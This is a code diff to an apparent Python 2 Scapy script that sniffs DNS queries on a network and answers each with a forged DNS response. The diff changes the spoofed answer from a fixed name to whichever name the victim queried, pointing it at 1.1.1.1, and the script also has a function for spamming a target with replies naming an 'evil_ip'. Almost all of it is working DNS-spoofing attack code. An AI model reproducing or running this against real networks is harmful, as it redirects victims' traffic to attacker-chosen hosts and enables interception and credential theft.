@@ -16,26 +16,18 @@ def sniff_dns(sniff_time):
 		sniff_time = int(sniff_time)
 	
 	print "sniffing for DNS requests for " + str(sniff_time) + " seconds"
-	sniff(prn=attack, store=1, timeout=sniff_time, filter=dns_filter)
-	print "TIME IS UP"
+	sniff(prn=attack, count=3, timeout=sniff_time, filter=dns_filter)
+	print "Limit Reached"
 #packet breakdown
 def attack(packet):
-	''' Debug stuff
-	print "****IP****"
-	print packet[IP].src
-	print packet[IP].dst
-
-	print "****UDP****"
-	print packet[UDP].sport
-	print packet[UDP].dport
-
-	print "****DNS****"
-	print packet[DNS].qd
-	'''
+	
 	print "Caught one sending one..."
-	poison=IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(sport=53, dport=packet[UDP].sport)/DNS(id=packet[DNS].id, qr=1, rd=1, ra=1, qdcount=1, ancount=1, qd=DNSQR(qname="www.blah.com", qtype="A", qclass="IN"), an=DNSRR(rrname="www.blah.com", type="A", rclass="IN",ttl=3599, rdata="1.1.1.1" ))
+	poison=IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(sport=53, dport=packet[UDP].sport) \
+	/DNS(id=packet[DNS].id, qr=1, rd=1, ra=1, qdcount=1, ancount=1, qd=DNSQR(qname=packet[DNSQR].qname, qtype="A", qclass="IN"), \
+	an=DNSRR(rrname=packet[DNSQR].qname, type="A", rclass="IN",ttl=3599, rdata="1.1.1.1" ))
+	
 	send(poison, inter=0, loop=0, verbose=0)
-
+	return
 #spam client with DNS replies
 def spam_replies(evil_ip, target):
 	print "About to spam " + target + " with IP: " + evil_ip
